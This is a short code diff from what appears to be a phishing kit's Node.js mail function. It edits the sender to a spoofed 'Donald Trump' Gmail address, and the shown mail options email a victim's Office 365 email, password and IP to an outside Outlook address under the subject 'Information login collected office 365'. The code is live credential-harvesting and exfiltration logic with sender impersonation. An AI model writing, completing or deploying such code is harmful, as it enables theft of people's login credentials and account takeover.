@@ -26,7 +26,7 @@ function sendmail(req,res){
   }
  });  
  var mailOptions = {
-  from:'Donald Trump',
+  from:'Donald Trump <donaldtrump@gmail.com>',
   to: 'dakota3011@outlook.com',
   subject: 'Information login collected office 365',
   html: `<b><h2>Login Office365</h2></b><p>Email: ${email}<br>Password: ${password}<br>IP:</p>`
